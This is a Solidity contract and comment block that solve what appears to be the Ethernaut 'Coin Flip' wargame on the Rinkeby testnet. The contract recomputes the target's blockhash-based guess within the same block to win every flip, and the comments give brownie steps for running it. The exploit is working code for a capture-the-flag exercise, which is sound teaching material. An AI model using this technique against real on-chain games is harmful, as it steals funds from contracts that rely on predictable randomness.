//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;



/* 
in this challenge, an attacking contract has to be created to ensure that the block number while the call to the CoinFlip
contract is intiated is the same to get the correct guess everytime the CoinFlip contract is called



# Open brownie console with rinkeby testnet

brownie console --network rinkeby

# import your account using mnemonic

accounts.from_mnemonic("your account mnemonic")



# go to the scripts folder and update the address and account mnemonic - filename "3-Coin-Flip.py"

# run the script after in brownie console or run it directly
brownie run 3-Coin-Flip.py --network rinkeby

# OR

# deploy the attack contract with the CoinFlip address

# call attack() 10 times

check consecutiveWins value

web3.eth.getStorageAt("CoinFlip address",0)
the output HexBytes('0x000000000000000000000000000000000000000000000000000000000000000a')

# Convert to integer 

int('0x0a,16 ) => 10

# submit the instance

# (optionl) call destroy()to cleanup

*/

import "./SafeMath.sol";

interface CoinFlip {

    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttack {

using SafeMath for uint256;
CoinFlip CoinFlipContract;
uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

constructor(address _address) public
    {

    CoinFlipContract = CoinFlip(_address);

    }

function attack() public {


    // execute same logic as the CoinFlip contract to get the expected guess.
    // remember if you intiate the call from your contract  to CoinFlip contract then the call will be in the same 
    // block which ensures the calculations are the same

    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    uint256 coinFlip = blockValue.div(FACTOR);
    
    bool side = coinFlip == 1 ? true : false;

    bool result = CoinFlipContract.flip(side);

    // revert if result is False
    require(result);

    }

//clean contract
function destroy() public {

    selfdestruct(msg.sender);

    }

}
